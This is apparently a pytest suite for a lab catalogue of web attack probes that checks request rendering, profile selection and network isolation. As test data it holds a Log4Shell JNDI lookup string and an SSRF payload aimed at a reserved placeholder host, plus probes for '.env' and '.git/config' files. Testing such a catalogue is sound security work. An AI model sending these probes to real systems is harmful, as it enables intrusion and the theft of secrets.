import copy
import json
import socket
from email import policy
from email.parser import BytesParser
from http.cookies import SimpleCookie
from urllib.parse import parse_qs, unquote, urlsplit
from xml.etree import ElementTree

import pytest

from modules.lab_catalogue import CATALOGUE_VERSION, PROBES, PROFILES, RISK_NOTICE, catalogue, render_cases


pytestmark = pytest.mark.unit
TARGET = "https://conversation-chosen.example.test/actual/lab-prefix"


@pytest.fixture(autouse=True)
def forbid_network(monkeypatch):
    def forbidden(*args, **kwargs):
        pytest.fail("Catalogue tests must not use DNS or network connections")

    for name in ("connect", "connect_ex"):
        monkeypatch.setattr(socket.socket, name, forbidden)
    monkeypatch.setattr(socket, "getaddrinfo", forbidden)


def test_catalogue_is_json_serializable_detached_and_explicit_about_risk():
    result = catalogue()
    assert json.loads(json.dumps(result, allow_nan=False)) == result
    assert result["catalogue_version"] == CATALOGUE_VERSION
    assert result["profiles"] == list(PROFILES)
    assert result["risk_notice"] == RISK_NOTICE
    assert "not harmless" in RISK_NOTICE and "authorized lab" in RISK_NOTICE
    assert result["rule_mapping_status"] == "candidate_family_only"
    assert len({case["case_id"] for case in result["cases"]}) == len(PROBES)
    assert any("response bodies are never persisted" in text for text in result["limitations"])
    before = copy.deepcopy(result)
    result["cases"][0]["payload"] = "modified"
    result["profiles"].clear()
    assert catalogue() == before


@pytest.mark.parametrize("profile", PROFILES)
def test_every_profile_selects_only_its_cases(profile):
    cases = render_cases([TARGET], [profile])
    expected = {probe.case_id for probe in PROBES if profile == "all" or probe.category == profile}
    assert cases
    assert {case["case_id"].rsplit("-", 1)[0] for case in cases} == expected
    assert len(cases) == sum(1 if probe.category == "smoke" else 2 for probe in PROBES
                             if probe.case_id in expected)
    assert all(case["target"] == TARGET for case in cases)


@pytest.mark.parametrize("profiles", [[], ["unknown"], ["SQLI"], ["sqli", "unknown"]])
def test_unsupported_or_empty_profiles_are_rejected(profiles):
    with pytest.raises(ValueError, match="supported profile"):
        render_cases([TARGET], profiles)


def test_profile_selection_is_deterministic_and_deduplicated():
    assert render_cases([TARGET], ["xss", "sqli", "sqli"]) == render_cases([TARGET], ["sqli", "xss"])
    assert render_cases([TARGET], ["all", "sqli"]) == render_cases([TARGET], ["all"])


@pytest.mark.parametrize("probe", PROBES, ids=lambda probe: probe.case_id)
def test_control_probe_pairs_are_valid_requests_with_exact_payloads(probe):
    cases = [case for case in render_cases([TARGET], [probe.category])
             if case["case_id"].rsplit("-", 1)[0] == probe.case_id]
    assert [case["is_control"] for case in cases] == ([True] if probe.category == "smoke" else [True, False])
    for case in cases:
        payload = probe.control if case["is_control"] else probe.payload
        url = urlsplit(case["url"])
        assert url.scheme == "https" and url.hostname == urlsplit(TARGET).hostname
        assert url.fragment == "" and "#" not in case["url"]
        assert case["variant"] == probe.location
        assert case["headers"]["Accept-Encoding"] == "identity"
        assert case["headers"]["Accept"] == "*/*"
        if probe.location == "path":
            assert url.path == urlsplit(TARGET).path + "/" + payload
        else:
            assert url.path == urlsplit(TARGET).path
        if probe.location == "query":
            assert case["method"] == "GET" and case["body"] is None
            assert parse_qs(url.query) == {"cf_tester": [payload]}
        else:
            assert not url.query
        if probe.location in ("json", "raw-json"):
            assert case["method"] == "POST" and case["headers"]["Content-Type"] == "application/json"
            assert json.loads(case["body"]) == (json.loads(payload) if probe.location == "raw-json"
                                                else {"cf_tester": payload})
        elif probe.location == "form":
            assert case["method"] == "POST"
            assert case["headers"]["Content-Type"] == "application/x-www-form-urlencoded"
            assert parse_qs(case["body"]) == {"cf_tester": [payload]}
        elif probe.location == "xml":
            assert case["method"] == "POST" and case["headers"]["Content-Type"] == "application/xml"
            root = ElementTree.fromstring(case["body"])
            assert root.tag == "probe"
            assert root.text == ("cf-tester-benign-marker" if case["is_control"] else "cf-tester")
            assert "SYSTEM" not in case["body"] and "PUBLIC" not in case["body"]
        elif probe.location == "multipart":
            assert case["method"] == "POST"
            content_type = case["headers"]["Content-Type"]
            message = BytesParser(policy=policy.default).parsebytes(
                f"Content-Type: {content_type}\r\nMIME-Version: 1.0\r\n\r\n".encode() + case["body"].encode())
            assert message.is_multipart() and not message.defects
            parts = list(message.iter_parts())
            assert len(parts) == 1 and not parts[0].defects
            assert parts[0].get_param("name", header="Content-Disposition") == "probe"
            assert parts[0].get_filename() == "cf-tester.txt"
            assert parts[0].get_payload(decode=True).decode() == payload
            assert case["body"].endswith(f"--{message.get_boundary()}--\r\n")
        elif probe.location == "cookie":
            cookies = SimpleCookie()
            cookies.load(case["headers"]["Cookie"])
            assert set(cookies) == {"cf_tester"}
            assert unquote(cookies["cf_tester"].value) == payload
            assert case["method"] == "GET" and case["body"] is None
        elif probe.location == "header":
            assert case["headers"]["X-CF-Tester-Probe"] == payload
        elif probe.location == "user-agent":
            assert case["headers"]["User-Agent"] == payload


@pytest.mark.parametrize("prefix", ["/", "/inert", "/actual/prefix/", "/v1.0/lab_~route"])
def test_sensitive_path_probes_append_to_the_actual_approved_prefix(prefix):
    target = "https://chosen.example.test" + prefix
    paths = [case for case in render_cases([target], ["managed"]) if case["variant"] == "path"]
    assert {urlsplit(case["url"]).path for case in paths if not case["is_control"]} == {
        prefix.rstrip("/") + "/.env", prefix.rstrip("/") + "/.git/config"}
    assert all(case["target"] == target for case in paths)


def test_rendered_requests_are_independent_and_confined_to_each_dynamic_target():
    targets = [TARGET, "https://different-conversation.example.test/other-prefix/"]
    result = render_cases(targets, ["all"])
    for target in targets:
        cases = [case for case in result if case["target"] == target]
        assert len(cases) == 49
        assert len({case["case_id"] for case in cases}) == len(cases)
        assert all(urlsplit(case["url"]).hostname == urlsplit(target).hostname for case in cases)
    before = render_cases(targets, ["all"])
    result[0]["headers"]["Authorization"] = "must-not-propagate"
    assert "Authorization" not in result[1]["headers"]
    assert render_cases(targets, ["all"]) == before


def test_callback_signatures_use_only_reserved_invalid_destinations():
    probes = {probe.category: probe for probe in PROBES if probe.category in ("ssrf", "log4j")}
    assert urlsplit(probes["ssrf"].payload).hostname == "cf-tester.invalid"
    assert probes["log4j"].payload == "${jndi:ldap://cf-tester.invalid/marker}"
